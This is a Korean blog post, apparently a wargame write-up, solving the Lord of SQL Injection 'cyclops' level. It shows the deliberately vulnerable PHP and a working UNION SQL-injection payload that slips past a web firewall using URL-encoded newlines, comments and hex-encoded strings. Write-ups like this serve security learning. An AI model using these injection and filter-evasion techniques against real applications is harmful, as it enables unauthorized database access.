@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - cyclops 문제풀이 | mingzzi</title>
+	<meta name="description" content="드디어 첫 번째 문제 업데이트의 마지막 문제인 cyclops 이다.이번 문제는 단순히 admin으로 로그인을 하는 문제가 아니었다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2019/06/17/los-cyclops.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - cyclops 문제풀이</h1>
+    
+    <p class="meta">
+      June 17, 2019
+      
+    </p>
+  </header>
+  <section class="post-content"><p>드디어 첫 번째 문제 업데이트의 마지막 문제인 <code class="highlighter-rouge">cyclops</code> 이다.</p>
+
+<p>이번 문제는 단순히 <code class="highlighter-rouge">admin</code>으로 로그인을 하는 문제가 아니었다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------------------------------------------
+query : select id,pw from prob_cyclops where id='' and pw=''
+-----------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id,pw from prob_cyclops where id='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="si">}</span><span class="s2">' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"first"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"second"</span><span class="p">))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"cyclops"</span><span class="p">);</span><span class="c1">//must use union select</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>이번에는 <code class="highlighter-rouge">id</code>가 <code class="highlighter-rouge">first</code>, <code class="highlighter-rouge">pw</code>가 <code class="highlighter-rouge">second</code>여야 한다.</p>
+
+<p>주석에 <code class="highlighter-rouge">must use union select</code>라고 적혀있는 것으로 보아 <code class="highlighter-rouge">union select 'first', 'second'</code> 같은 형태로 만들면 될 것 같다.</p>
+
+<p>그래서 일단 아래처럼 시도 해 보았다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=1' union select 'first', 'second'#&amp;pw=a
+</code></pre></div></div>
+
+<p>그럼 완성되는 쿼리는 아래와 같을 것이다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select id,pw from prob_cyclops where id='1' union select 'first', 'second'#' and pw='a'
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">'and pw='a'</code>는 주석처리 되어 실행되지 않기 때문에 결과적으로 <code class="highlighter-rouge">union select 'first', 'second</code>만 실행되며 <code class="highlighter-rouge">fist</code>, <code class="highlighter-rouge">second</code>만 추출 될 것이라고 생각했다.</p>
+
+<p>그런데 저렇게 값을 넣으니까 방화벽에 잡혔다 ㅠㅠ</p>
+
+<p>그렇게 호락호락한 문제가 아니었다 ㅠㅠ</p>
+
+<p>그 뒤로 이것저것 시도 해 보다가 <code class="highlighter-rouge">개행 문자(%0a%0d)</code>를 넣어주면 방화벽에 잡히지 않는다는 것을 찾을 수 있었다.</p>
+
+<p>또한 <code class="highlighter-rouge">select 'first', 'second'</code> 처럼 썼더니 또 방화벽에 걸려서 <code class="highlighter-rouge">select 0x6669727374, 0x7365636f6e64''</code>를 사용했다.</p>
+
+<p><code class="highlighter-rouge">0x6669727374</code>는 <code class="highlighter-rouge">first</code>이고, <code class="highlighter-rouge">0x7365636f6e64</code>는 <code class="highlighter-rouge">second</code>이며 뒤의 <code class="highlighter-rouge">''</code>는 아무 출력도 하지 않을 것이다.</p>
+
+<p>최종적으로 입력한 값은 아래와 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=1'%23&amp;pw=%0a%0dunion %23%0a%0ddistinct select 0x6669727374, 0x7365636f6e64''%23
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">%23(#)</code>과 <code class="highlighter-rouge">%0a%0d(개행문자)</code>는 그래도 <code class="highlighter-rouge">URL Encoding</code> 해서 넘겨주었다.</p>
+
+<p>그러면 완성되는 쿼리는 아래와 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select id,pw from prob_cyclops where id='1'#' and pw=' 
+union # 
+distinct select 0x6669727374, 0x7365636f6e64''#'
+</code></pre></div></div>
+
+<p>첫 줄의 <code class="highlighter-rouge">id='1'#' and pw='</code>에서 <code class="highlighter-rouge">id='1'</code> 뒤의 값은 <code class="highlighter-rouge">#</code> 때문에 주석처리 된다.</p>
+
+<p>개행 된 쿼리를 보고싶다면, 개행문자를 입력한 후 <code class="highlighter-rouge">Ctrl + u</code>를 통해 <code class="highlighter-rouge">소스보기</code>를 하면 아래와 같이 확인할 수 있다.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;hr&gt;</span>query : <span class="nt">&lt;strong&gt;</span>select id,pw from prob_cyclops where id='1'#' and pw='
+
+union #
+
+distinct select 0x6669727374, 0x7365636f6e64''#'<span class="nt">&lt;/strong&gt;&lt;hr&gt;</span>
+</code></pre></div></div>
+
+<p>어쨌든 이를 통해 문제를 풀 수 있었다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------------------------------------------------------------------------------------------------------------------------------
+query : select id,pw from prob_cyclops where id='1'#' and pw=' union # distinct select 0x6669727374, 0x7365636f6e64''#'
+---------------------------------------------------------------------------------------------------------------------------------
+
+CYCLOPS Clear!
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id,pw from prob_cyclops where id='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="si">}</span><span class="s2">' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"first"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"second"</span><span class="p">))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"cyclops"</span><span class="p">);</span><span class="c1">//must use union select</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">CYCLOPS Clear!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2019/06/17/los-cyclops.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/06/14/los-godzilla.html">
+        [Lord of SQL Injection] LoS - godzilla 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/06/18/los-chupacabra.html">
+        [Lord of SQL Injection] LoS - chupacabra 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
